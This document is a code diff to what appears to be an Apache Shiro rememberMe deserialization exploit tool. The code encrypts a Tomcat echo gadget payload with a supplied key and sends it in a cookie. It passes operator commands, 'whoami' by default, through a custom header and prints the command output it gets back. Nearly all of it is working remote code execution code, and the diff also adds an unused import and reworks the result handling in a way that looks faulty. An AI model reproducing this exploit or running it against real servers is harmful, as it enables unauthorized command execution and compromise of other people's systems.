@@ -6,6 +6,7 @@
 
 import argparse
 import base64
+from logging import error
 import os
 import random
 import re
@@ -203,51 +204,37 @@ class Exploit(Command):
 
         if gadget in tomcatEchoPayload:
             checker = str(uuid.uuid1())
-
-            command = self.command + " && echo " + checker if self.command else "whoami"+ " && echo "+ checker
+            payload_command = self.command + " && echo " + checker if self.command else "whoami"+ " && echo "+ checker
 
             headers = {"User-Agent":Factory.create().user_agent(),
                         "Connection":"close",
                         "Testecho":checker,
-                        "Testcmd":command}
+                        "Testcmd":payload_command}
 
             if type == "GCM":
                 payload = Payload(key).gcm_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()
             else:
                 payload = Payload(key).cbc_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()
-            try:
-                if url:
-                    cookie = {"rememberMe":payload}
-                    rsp = requests.get(self.url, headers=headers, cookies=cookie, verify=False, stream=True)
-                    if rsp.headers["Testecho"] == checker:
-                        print("[*] Congratulation: exploit success!")
-                        regex = re.compile(r'((?:.|\n)*){0}'.format(checker))
-                        try:
-                            flag = 0
-                            try:
-                                for i in rsp.iter_content(chunk_size=102400):
-                                    if checker in str(i.decode()):
-                                        flag = 1
-                                        print(i.decode().replace(checker,"")) 
-                            except Exception as e:
-                                print(e)
-                            if flag != 1:
-                                result = regex.findall(rsp.text)
-                                print(result[0])
-                        except KeyError as e:
-                            print(e)
-                            print("[!] Failed to get result,check response manual!")
-                            print("[*] Testecho: {}".format(checker))
-                            print("[*] Cookie: rememberMe={}".format(payload))
-                else:
-                    print("[*] Exploit Manual: ")
-                    print("[*] Testcmd: whoami")
-                    print("[*] Cookie: rememberMe={}".format(payload))
-            except Exception as e:
-                    print("[*] Something error: {}".format(e))
-                    print("[*] Exploit Manual: ")
-                    print("[*] Testecho: {}".format(checker))
-                    print("[*] Cookie: rememberMe={}".format(payload))
+
+            cookie = {"rememberMe":payload}
+            rsp = requests.get(self.url, headers=headers, cookies=cookie, verify=False, stream=True)
+            if rsp.headers["Testecho"] == checker:
+                print ("[*] Tomcat echo Exploit success")
+                regex=re.compile(r'((?:.|\n)*){0}'.format(checker))
+                for i in rsp.iter_content(chunk_size=102400):
+                    if checker in str(i.decode()):
+                        print (i.decode().replace(checker,""))
+                        break
+                    elif regex.findall(rsp.text) == []:
+                        print ("Something error: ")
+                        print ("Exploit Manual: ")
+                        print ("Testcmd: whoami")
+                        print ("Cookie: rememberMe={}".format(payload))
+                        break
+                    else:
+                        print(regex.findall(rsp.text)[0])
+                        break
+
         else:
             print("[!] Gadget Not Support")
 
